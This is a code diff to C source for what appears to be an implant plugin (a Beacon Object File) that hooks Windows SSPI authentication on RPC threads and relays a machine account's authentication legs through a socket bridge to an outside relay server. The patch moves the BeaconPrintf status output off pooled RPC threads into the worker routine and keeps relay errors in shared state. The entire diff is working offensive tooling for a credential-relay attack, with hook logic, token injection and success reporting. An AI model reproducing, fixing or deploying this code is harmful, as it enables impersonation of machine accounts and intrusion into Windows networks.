@@ -212,6 +212,8 @@ typedef struct {
     int detail;
     int trace;
     int bridge_failed;
+    int bridge_error_ready;
+    char bridge_error[MAX_ERROR + 1];
     int rewrite_security_binding;
     int com_security_immutable;
 
@@ -561,9 +563,6 @@ static int bridge_connect(void) {
     if (g_state.bridge == INVALID_SOCKET) {
         return 0;
     }
-    BeaconPrintf(CALLBACK_OUTPUT,
-                 "[+] Relay bridge connected via %s:%d\n",
-                 g_state.relay_host, g_state.relay_port);
     return 1;
 }
 
@@ -654,8 +653,10 @@ static void report_bridge_error(BYTE *data, ULONG length) {
     ULONG i;
     g_state.bridge_failed = 1;
     if (!data || !length) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "[-] Relay server returned an unspecified error\n");
+        static const char unspecified[] =
+            "Relay server returned an unspecified error";
+        kcopy(g_state.bridge_error, unspecified, sizeof(unspecified));
+        g_state.bridge_error_ready = 1;
         return;
     }
     /* Clamp defense-in-depth even though recv_record already validates length. */
@@ -669,7 +670,8 @@ static void report_bridge_error(BYTE *data, ULONG length) {
         }
     }
     data[length] = 0;
-    BeaconPrintf(CALLBACK_ERROR, "[-] Relay server: %s\n", (char *)data);
+    kcopy(g_state.bridge_error, data, length + 1);
+    g_state.bridge_error_ready = 1;
 }
 
 static int recv_auth_reply(BYTE *kind, BYTE **data, ULONG *length) {
@@ -687,8 +689,12 @@ static int recv_auth_reply(BYTE *kind, BYTE **data, ULONG *length) {
     *data = NULL;
     *length = 0;
     g_state.bridge_failed = 1;
-    BeaconPrintf(CALLBACK_ERROR,
-                 "[-] Relay server returned an out-of-state message\n");
+    {
+        static const char invalid_state[] =
+            "Relay server returned an out-of-state message";
+        kcopy(g_state.bridge_error, invalid_state, sizeof(invalid_state));
+        g_state.bridge_error_ready = 1;
+    }
     return 0;
 }
 
@@ -1321,6 +1327,9 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
     SecBuffer *runtime_output = NULL;
     SECURITY_STATUS status;
 
+    /* This callback executes on an RPC thread that can remain pooled after
+     * the BOF unloads. Never call a Beacon API here; record task state and let
+     * run_relay() publish it from the BOF-owned worker before that worker exits. */
     atomic_add(&g_state.active_callbacks, 1);
 
     /* Once Python owns an authenticated target connection, later unrelated SSPI
@@ -1357,17 +1366,11 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
             if (!exchange_complete && !g_state.bridge_failed) {
                 g_state.bridge_failed = 1;
                 g_state.stage = STAGE_RELAY_BRIDGE;
-                BeaconPrintf(CALLBACK_ERROR,
-                             "[-] Relay transport failed on authentication "
-                             "leg %d\n", g_state.callback_count + 1);
             }
             if (exchange_complete) {
                 if (message_type == BRIDGE_SERVER_TOKEN && reply_len) {
                     /* A server token completed this relay leg and advances SPNEGO. */
                     g_state.relayed_leg_count++;
-                    BeaconPrintf(CALLBACK_OUTPUT,
-                                 "[*] Relayed authentication leg %d\n",
-                                 g_state.relayed_leg_count);
                     g_state.trace |= TRACE_RELAY_CONTINUATION;
                     release(g_state.continuation);
                     g_state.continuation = reply;
@@ -1376,13 +1379,7 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
                 } else if (message_type == BRIDGE_AUTH_OK) {
                     /* AUTH_OK confirms that the target accepted the client identity. */
                     g_state.relayed_leg_count++;
-                    BeaconPrintf(CALLBACK_OUTPUT,
-                                 "[*] Relayed authentication leg %d\n",
-                                 g_state.relayed_leg_count);
                     g_state.success = 1;
-                    BeaconPrintf(
-                        CALLBACK_OUTPUT,
-                        "[+] Relay target authenticated the machine account\n");
                 } else if (message_type == BRIDGE_ERROR) {
                     /* An explicit adapter failure is terminal and is not a relayed leg. */
                     g_state.stage = STAGE_RELAY_TARGET;
@@ -1444,8 +1441,6 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
             g_state.bridge_failed = 1;
             g_state.stage = STAGE_RELAY_CONTINUATION;
             send_record(BRIDGE_ERROR, message, sizeof(message) - 1);
-            BeaconPrintf(CALLBACK_ERROR,
-                         "[-] RPCSS authentication response was unavailable\n");
             status = SEC_E_BUFFER_TOO_SMALL;
             goto accept_done;
         }
@@ -1454,10 +1449,6 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
             g_state.bridge_failed = 1;
             g_state.stage = STAGE_RELAY_CONTINUATION;
             send_record(BRIDGE_ERROR, message, sizeof(message) - 1);
-            BeaconPrintf(CALLBACK_ERROR,
-                         "[-] Relay continuation exceeds RPCSS "
-                         "capacity (%lu > %lu)\n",
-                         g_state.continuation_len, runtime_output->cbBuffer);
             status = SEC_E_BUFFER_TOO_SMALL;
             goto accept_done;
         }
@@ -1465,9 +1456,6 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
         g_state.trace |= TRACE_CONTINUATION_INJECTED;
         kcopy(output_target, g_state.continuation, g_state.continuation_len);
         runtime_output->cbBuffer = g_state.continuation_len;
-        BeaconPrintf(CALLBACK_OUTPUT,
-                     "[*] Applied relay continuation to authentication leg %d\n",
-                     g_state.relayed_leg_count);
     }
 accept_done:
     release(g_state.continuation);
@@ -1878,6 +1866,7 @@ static int register_task_resolver(void) {
 static int run_relay(void) {
     CLSID clsid;
     HRESULT hr;
+    int leg;
     char service_spn[256];
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Initializing COM/RPC relay\n");
@@ -1911,6 +1900,31 @@ static int run_relay(void) {
     }
 
     g_state.success = activation_once(&clsid);
+    /* Beacon output APIs are invoked only from this short-lived BOF worker.
+     * The SSPI hook runs on long-lived RPC pool threads; calling BeaconPrintf
+     * there registers loader/FLS cleanup state that outlives the BOF image. */
+    if (g_state.callback_count > 0) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "[+] Relay bridge connected via %s:%d\n",
+                     g_state.relay_host, g_state.relay_port);
+    }
+    for (leg = 1; leg <= g_state.relayed_leg_count; leg++) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "[*] Relayed authentication leg %d\n", leg);
+        if ((g_state.trace & TRACE_RELAY_CONTINUATION) && leg == 1) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                         "[*] Applied relay continuation to "
+                         "authentication leg 1\n");
+        }
+    }
+    if (g_state.success) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "[+] Relay target authenticated the machine account\n");
+    }
+    if (g_state.bridge_error_ready) {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[-] Relay server: %s\n", g_state.bridge_error);
+    }
     if (g_state.success) {
         g_state.stage = STAGE_RELAY_COMPLETE;
     }
